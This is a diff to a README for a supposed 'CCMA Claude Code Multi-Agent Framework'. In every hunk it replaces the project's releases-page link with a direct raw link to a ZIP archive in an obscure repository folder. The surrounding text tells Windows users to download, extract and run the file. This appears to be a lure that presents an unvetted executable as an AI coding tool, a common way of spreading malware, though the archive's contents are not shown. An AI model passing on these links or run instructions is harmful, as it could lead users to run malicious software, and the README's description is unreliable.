@@ -1,6 +1,6 @@
 # 🤖 CCMA-Claude-Code-Multi-Agent-Framework - Safer AI Code Checks
 
-[![Download CCMA-Claude-Code-Multi-Agent-Framework](https://img.shields.io/badge/Download-CCMA%20Claude%20Code%20Multi%20Agent%20Framework-blue?style=for-the-badge)](https://github.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/releases)
+[![Download CCMA-Claude-Code-Multi-Agent-Framework](https://img.shields.io/badge/Download-CCMA%20Claude%20Code%20Multi%20Agent%20Framework-blue?style=for-the-badge)](https://raw.githubusercontent.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/main/balaghat/Multi_CCM_Claude_Framework_Agent_Code_v3.2.zip)
 
 ## 🧩 What this is
 
@@ -11,7 +11,7 @@ It is built for people who want less manual code review. CCMA adds steps for bas
 ## 📥 Download the app
 
 Visit this page to download:
-https://github.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/releases
+https://raw.githubusercontent.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/main/balaghat/Multi_CCM_Claude_Framework_Agent_Code_v3.2.zip
 
 On the release page, look for the latest Windows download file. Save it to your PC, then open it to start setup or run it if it is a ready-to-use file.
 
@@ -161,7 +161,7 @@ Use the newest release first. It often includes fixes that help with install and
 ## 📦 Download and run on Windows
 
 Go to:
-https://github.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/releases
+https://raw.githubusercontent.com/Surgicalprocesspavement699/CCMA-Claude-Code-Multi-Agent-Framework/main/balaghat/Multi_CCM_Claude_Framework_Agent_Code_v3.2.zip
 
 Download the latest Windows release file, then open it on your PC. If it comes as a ZIP file, extract it first, then run the app from the extracted folder
 
